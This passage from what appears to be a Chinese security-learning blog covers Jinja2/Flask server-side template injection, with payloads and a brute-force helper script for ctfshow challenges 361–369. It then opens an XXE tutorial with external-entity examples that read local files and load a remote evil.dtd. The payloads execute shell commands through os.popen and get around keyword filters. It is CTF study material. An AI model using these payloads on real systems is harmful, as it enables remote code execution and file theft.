random</h4><p>返回第一个最后一个或者随机，随机可以写脚本爆破，举个例子，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__|last()<br>相当于<br><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><h4 id="4-join"><a href="#4-join" class="headerlink" title="4.join"></a>4.join</h4><p>我个人认为就是用于拼接的，直接上例子，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>[[<span class="hljs-string">&#x27;__clas&#x27;</span>,<span class="hljs-string">&#x27;s__&#x27;</span>]|join] 或者 <span class="hljs-string">&quot;&quot;</span>[(<span class="hljs-string">&#x27;__clas&#x27;</span>,<span class="hljs-string">&#x27;s__&#x27;</span>)|join]<br>相当于<br><span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;__class__&quot;</span>]<br></code></pre></td></tr></table></figure><h4 id="5-select和string"><a href="#5-select和string" class="headerlink" title="5.select和string"></a>5.select和string</h4><p>顾名思义选择和转化为字符，先选择字符串的内容，再转化为字母，可以构造拼接__class__</p><h2 id="四、靶场练习"><a href="#四、靶场练习" class="headerlink" title="四、靶场练习"></a>四、靶场练习</h2><h4 id="知识点-利用链"><a href="#知识点-利用链" class="headerlink" title="知识点:利用链"></a>知识点:利用链</h4><p>注意因python2,3以及版本的原因，是有部分差异的</p><p><strong>1.os._wrap_close</strong> 类popen,比如下面</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&quot;&quot;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">134</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-link">&#x27;whoami&#x27;</span>).read()<br></code></pre></td></tr></table></figure><p><strong>2.os直接使用</strong></p><p><strong>3.__import__下的os</strong></p><p>种类还有很多，可以自己多加尝试总结。</p><p><strong>4.flask内置</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Flask内置函数和内置对象可以通过&#123;&#123;self.<span class="hljs-strong">__dict__</span>.<span class="hljs-emphasis">_TemplateReference<span class="hljs-strong">__context.keys()&#125;&#125;查看，然后可以查看一下这几个东西的类型，类可以通过__</span>init<span class="hljs-strong">__方法跳到os，函数直接用__</span>globals<span class="hljs-strong">__方法跳到os。（payload一下子就简洁了）</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis">&#123;&#123;self.__</span>dict<span class="hljs-strong">__._TemplateReference__</span>context.keys()&#125;&#125;</span><br><span class="hljs-emphasis">#查看内置函数</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">#函数：lipsum、url_</span>for、get<span class="hljs-emphasis">_flashed_</span>messages<br><span class="hljs-section">#类：cycler、joiner、namespace、config、request、session</span><br>&#123;&#123;lipsum.<span class="hljs-strong">__globals__</span>.os.popen(&#x27;ls&#x27;).read()&#125;&#125;<br><span class="hljs-section">#函数</span><br>&#123;&#123;cycler.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.os.popen(&#x27;ls&#x27;).read()&#125;&#125;<br><span class="hljs-section">#类</span><br></code></pre></td></tr></table></figure><p><strong>5.通过getshell</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">原理就是找到含有 <span class="hljs-strong">__builtins__</span> 的类，然后利用<br><br>&#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if c.<span class="hljs-strong">__name__</span>==&#x27;catch<span class="hljs-emphasis">_warnings&#x27; %&#125;&#123;&#123; c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].eval(&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="hljs-emphasis">#读写文件</span><br><span class="hljs-emphasis">&#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if c.<span class="hljs-strong">__name__</span>==&#x27;catch_</span>warnings&#x27; %&#125;&#123;&#123; c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><h3 id="1-ctfshow-361"><a href="#1-ctfshow-361" class="headerlink" title="1.ctfshow 361"></a>1.ctfshow 361</h3><p>尝试一下**?name&#x3D;49**,发现是模板注入，输出是49</p><p>接着常规思路</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/361-1.png" alt="361-1"></p><p>继续找子类,搜索os</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1].<span class="hljs-strong">__subclasses__</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/361-2.png" alt="361-2"></p><p>利用这里面的popen得到flag</p><p>因为每个环境使用的python库不同 所以类的排序有差异，本地并不一定是132，比如我用的3.9本地测的是134,自己找脚本跑一下就得到132了</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">1</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">132</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-link">&#x27;tac /????&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/361-3.png" alt="361-3"></p><p>也可以用控制块来</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;% print(url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;eval&#x27;</span>](&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;))%&#125;</span><br></code></pre></td></tr></table></figure><h3 id="2-ctfshow-362"><a href="#2-ctfshow-362" class="headerlink" title="2.ctfshow 362"></a>2.ctfshow 362</h3><p>正常的思路先测一下是否是模板注入</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;1-1&#125;&#125;<br></code></pre></td></tr></table></figure><p>发现是正确的，然后测看看子类，也是可以进行的</p><p>但是最后发现应该把<strong>数字过滤</strong>了，那就试试另外一种吧</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;% print(url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;eval&#x27;</span>](&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;))%&#125;</span><br></code></pre></td></tr></table></figure><p>这种还是可以直接写出来的</p><p>另外一种解法就是通过全角数字的解法得到答案</p><h3 id="3-ctfshow-363"><a href="#3-ctfshow-363" class="headerlink" title="3.ctfshow 363"></a>3.ctfshow 363</h3><p>这题在此基础上<strong>过滤了引号</strong>，由此并不能直接用上面的方法，我尝试调用os.__class__.close并且用全角符号进行绕过,并且运用request.args.来间接调用发现好像并不能执行，因此，借鉴一下得到了一种解法</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">request.args.a</span>][<span class="hljs-symbol">request.args.b</span>](request.args.c).read()&#125;&#125;&amp;a=os&amp;b=popen&amp;c=cat /flag</span><br></code></pre></td></tr></table></figure><p>request.args用于获取 URL 中的查询参数如果有就返回如果没有将引发异常，这里后面的输入就可以得到答案了。</p><p>config.__str__[2]就是o可以拼接os,但是字母不够，仅仅是一种思路</p><p>此外还有一种利用chr的方式,也是可以的</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;% set chr=url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>.chr %&#125;&#123;% print url_</span>for.<span class="hljs-strong">__globals__</span>[chr(111)%2bchr(115)]%&#125;<br></code></pre></td></tr></table></figure><h3 id="4-ctfshow-364"><a href="#4-ctfshow-364" class="headerlink" title="4.ctfshow 364"></a>4.ctfshow 364</h3><p>这题<strong>过滤了args</strong>,这题可以用request.values来传参，相比之下values支持get和post，优先级的话是先get,使用方法基本一样</p><p>上payload</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">request.values.a</span>][<span class="hljs-symbol">request.values.b</span>](request.values.c).read()&#125;&#125;&amp;a=os&amp;b=popen&amp;c=cat /flag</span><br></code></pre></td></tr></table></figure><p>当然这题发现好像也可以传cookies来进行</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/364.png" alt="364"></p><p>当然了也可以用lipsum来，lipsum里面有内置的os模块</p><p>payload是</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;lipsum.<span class="hljs-strong">__globals__</span>.os.popen(request.values.aaa).read()&#125;&#125;&amp;aaa=cat /flag<br></code></pre></td></tr></table></figure><h3 id="5-ctfshow-365"><a href="#5-ctfshow-365" class="headerlink" title="5.ctfshow 365"></a>5.ctfshow 365</h3><p>这题用上面的lipsum的payload可以直接出答案</p><p>看了一下网上的wp这题是**过滤[]**，在上面的内容讲到过__getitem__，在遇到了‘和[]被禁用的时候可以使用这个函数</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;config.<span class="hljs-strong">__str__</span>().<span class="hljs-strong">__getitem__</span>(22)&#125;&#125;<br></code></pre></td></tr></table></figure><p>在这一题里面22是c，可以尝试构造cat &#x2F;flag，用~来拼接起来</p><h3 id="6-ctfshow-366"><a href="#6-ctfshow-366" class="headerlink" title="6.ctfshow 366"></a>6.ctfshow 366</h3><p>这题在前面题目的基础上<strong>过滤了下划线</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)()&#125;&#125;&amp;ocean=cat /flag&amp;a=<span class="hljs-strong">__globals__</span>&amp;b=<span class="hljs-strong">__getitem__</span>&amp;c=os&amp;d=popen&amp;f=read<br></code></pre></td></tr></table></figure><p>这里我自己有一个疑惑点，觉得getitem不是必要的，但是输入后又不正确，通过gpt询问后，给的大致原因是</p><p>第二个URL之所以能够执行，是因为它使用了 <code>__getitem__</code> 这种更灵活的方式来访问全局变量，从而成功获取到 <code>os</code> 模块，并最终执行了命令。而第一个URL中直接使用 <code>attr</code> 的方式可能会因为解析问题而失败。我的理解是并不能直接有效的访问到os这个模块</p><p>由于只是检测name里面的传参，其实也可以精简一点用cookie来传参</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/366.png" alt="366"></p><p>PS(我认为这里换values，进行post传参也是一种方法，但是方法不成立orz)</p><h3 id="7-ctfshow-367"><a href="#7-ctfshow-367" class="headerlink" title="7.ctfshow 367"></a>7.ctfshow 367</h3><p>这题<strong>过滤os</strong></p><p>直接用上面的payload直接可以过，看wp有一种是用get的方法</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=<span class="hljs-strong">__globals__</span>&amp;b=os&amp;c=cat /flag<br></code></pre></td></tr></table></figure><p>366的payload使用多个 <code>attr</code> 需要模板引擎逐步解析并执行每个步骤，在某些情况下可能出现解析和执行顺序问题，导致无法正确执行 <code>read</code>。</p><p>这一题的payload链式调用方式更简单，直接执行一系列方法调用，容易通过模板引擎解析并执行</p><p>至于我想的问题？上面的为什么后面不能直接调用read()</p><p>每一步 <code>attr</code> 调用之间是独立的，模板引擎会分别解析和执行每个 <code>attr</code>，这样导致在调用 <code>os.popen(&quot;cat /flag&quot;)</code> 后，结果没有直接传递给 <code>attr(request.values.f)()</code>。因此，模板引擎可能在 <code>attr</code> 调用之间无法正确链接上下文，导致 <code>read</code> 无法直接执行。</p><p>这是两者payload的区别，也是记录一下方便回顾。</p><h3 id="8-ctfshow-368"><a href="#8-ctfshow-368" class="headerlink" title="8.ctfshow 368"></a>8.ctfshow 368</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">测试了一下，这题禁用前双花括号,可以利用&#123;%...%&#125;，利用&#123;%print %&#125;打印出来<br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%&#125;&amp;a=<span class="hljs-strong">__globals__</span>&amp;b=os&amp;c=cat /flag<br></code></pre></td></tr></table></figure><h3 id="9-ctfshow-369"><a href="#9-ctfshow-369" class="headerlink" title="9.ctfshow 369"></a>9.ctfshow 369</h3><p>这题<strong>禁用了request</strong>，就比较麻烦了</p><p>由于下划线被禁用了，不能使用getitem,看了师傅的wp,可以参照365部分的知识点，利用config里面string就行拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;f44b83e7-b564-400c-a10a-7dfd8acc96d3.challenge.ctf.show/?name=&#123;&#123;% print (config|string|list).pop(&#123;&#125;).lower() %&#125;&#125;&quot;</span><br>payload = <span class="hljs-string">&quot;cat /flag&quot;</span><br>result = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># 遍历 payload 中的每个字符</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> payload:<br>    <span class="hljs-comment"># 尝试从 0 到 999 的整数值</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1000</span>):<br>        <span class="hljs-comment"># 向目标 URL 发送请求，替换占位符</span><br>        r = requests.get(url=url.<span class="hljs-built_in">format</span>(i))<br>        <span class="hljs-comment"># 查找响应中的 &lt;h3&gt; 标签位置</span><br>        location = r.text.find(<span class="hljs-string">&quot;&lt;h3&gt;&quot;</span>)<br>        <span class="hljs-comment"># 获取 &lt;h3&gt; 标签后的字符</span><br>        word = r.text[location+<span class="hljs-number">4</span>:location+<span class="hljs-number">5</span>]<br>        <span class="hljs-comment"># 如果字符匹配，记录并跳出循环</span><br>        <span class="hljs-keyword">if</span> word == j.lower():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;(config|string|list).pop(%d).lower() == %s&quot;</span> % (i, j))<br>            result += <span class="hljs-string">&quot;(config|string|list).pop(%d).lower()~&quot;</span> % (i)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># 打印最终结果，去掉末尾的 ~</span><br><span class="hljs-built_in">print</span>(result[:-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>简要的payload就是</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;%print (lipsum|attr(a)).get(b).popen(c).read()%&#125;<br></code></pre></td></tr></table></figure><p>其中的abc，分别是<code>__globals__</code>,os,cat &#x2F;flag,带入构成payload</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/369.png" alt="369"></p><p>还有一种替换字符的没怎么看懂就不写了</p><p>后面的三题没怎么看懂wp，orz,大题就是利用dict构造得到数字，然后利用得到最后拼接的意思，这次就先写到这里了。</p><h2 id="五、刷题有感"><a href="#五、刷题有感" class="headerlink" title="五、刷题有感"></a>五、刷题有感</h2><p>这里放一下刷题遇到的姿势</p><h3 id="unicode绕过"><a href="#unicode绕过" class="headerlink" title="unicode绕过"></a>unicode绕过</h3><p>适用于禁用了一些常规的还把.给禁用的，配合attr|有奇效</p><p>例题:<a href="https://www.nssctf.cn/problem/910">安洵杯 2020Normal SSTI</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xxe漏洞学习</title>
    <link href="/2024/06/10/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/06/10/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>前言:深入浅出的学习一下xxe漏洞</p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/3357?time__1311=n4+xnD0DgGYQwqYq40HpDUoL7rAT2rD&alichlgref=https://www.google.com/">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p><p><a href="https://blog.csdn.net/qq_61553520/article/details/130565993">XXE漏洞详解(全网最详细)</a></p><p><a href="https://blog.csdn.net/jayq1/article/details/139299924">【CTF-Web】XXE学习笔记</a></p><h2 id="一、XXE-是什么"><a href="#一、XXE-是什么" class="headerlink" title="一、XXE 是什么"></a><strong>一、XXE 是什么</strong></h2><p>在了解xxe之前，需要了解一下xml注入，通常都是逻辑漏洞，如下内容</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/xml.png" alt="xml"></p><p>能插入xml代码，肯定还想要更多骚操作，于是就出现了xxe</p><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，是一个注入漏洞。注意的是<strong>外部实体</strong>，不要被其他名字相似的东西扰乱了思维。</p><h2 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a>二、基础知识</h2><h3 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h3><p>漏洞成因：解析时未对XML外部实体加以限制，导致攻击者将恶意代码注入到XML中，导致服务器加载恶意的外部实体引发文件读取，SSRF，命令执行等危害操作。</p><p>特征：HTTP的Request报文出现以下请求报文，说明采用的是xml数据传输，可以进行xml测试漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Content-<span class="hljs-built_in">type</span>:text/xml application/xml<br></code></pre></td></tr></table></figure><h3 id="XML的基础知识"><a href="#XML的基础知识" class="headerlink" title="XML的基础知识"></a>XML的基础知识</h3><h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">XML 指可扩展标记语言（EXtensible Markup Language）<br>XML 是一种标记语言，很类似 HTML<br>XML 被设计为传输和存储数据，其焦点是数据的内容<br>XML 被设计用来结构化、存储以及传输信息<br>XML 允许创作者定义自己的标签和自己的文档结构<br></code></pre></td></tr></table></figure><h4 id="结构"><a href="#结构" class="headerlink" title="结构:"></a>结构:</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1.XML 文档声明，在文档的第一行<br>2.XML 文档类型定义，即DTD，XXE 漏洞所在的地方<br>3.XML 文档元素<br></code></pre></td></tr></table></figure><h4 id="格式规范DTD"><a href="#格式规范DTD" class="headerlink" title="格式规范DTD:"></a>格式规范DTD:</h4><p>XML 文档有自己的格式规范，这个格式规范是 DTD（document type definition） 来控制的，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义<br>&lt;!DOCTYPE message [<br>&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;<br>&lt;!ELEMENT receiver (#PCDATA)&gt;<br>&lt;!ELEMENT sender (#PCDATA)&gt;<br>&lt;!ELEMENT header (#PCDATA)&gt;<br>&lt;!ELEMENT msg (#PCDATA)&gt;<br></code></pre></td></tr></table></figure><p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span>&gt;</span></span>Myself<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">sender</span>&gt;</span></span>Someone<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">sender</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span></span>TheReminder<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">msg</span>&gt;</span></span>This is an amazing book<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">msg</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>除了定义元素，还可以定义实体，分为内部实体和外部实体</p><h5 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;<br></code></pre></td></tr></table></figure><p>这里定义元素是ANY，说明接受任何元素，但是又定义了一个实体(也可以把他看成一个变量)，那么就可以写作这样</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们使用了&amp;xxe对上面定义的xxe实体进行了引用，到时候输出的时候&amp;xxe就会被test替代。</p><h5 id="外部实体-重点"><a href="#外部实体-重点" class="headerlink" title="外部实体(重点)"></a>外部实体(重点)</h5><p>有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，<br>外部实体的引用可以利用如下协议<br>file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.ext<br><a href="http://url/file.ext">http://url/file.ext</a><br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;conf.php</p><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;<br>&lt;creds&gt;<br>    &lt;user&gt;&amp;xxe;&lt;/user&gt;<br>    &lt;pass&gt;mypass&lt;/pass&gt;<br>&lt;/creds&gt;<br></code></pre></td></tr></table></figure><p>这样对引用资源所做的任何更改都会在文档中自动更新</p><p>还有一种引用方式是使用 引用公用 DTD的方法,如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;<br>%xxe;<br>]&gt;<br>&lt;foo&gt;&amp;evil;&lt;/foo&gt;<br> <br>外部evil.dtd中的内容<br>&lt;!ENTITY evil SYSTEM “file:///d:/1.txt” &gt;<br></code></pre></td></tr></table></figure><p>%xxe执行后会加载外部实体 evil.dtd 并执行，得到的结果会放在&lt;foo&gt;&lt;&#x2F;foo&gt;中。</p><hr><p>我们在上面将实体分为了内部和外部，但是实际情况上，也可以分为通用实体和参数实体（orz</p><h5 id="通用实体"><a href="#通用实体" class="headerlink" title="通用实体"></a>通用实体</h5><p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用，例如</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">updateProfile</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span></span><br><span 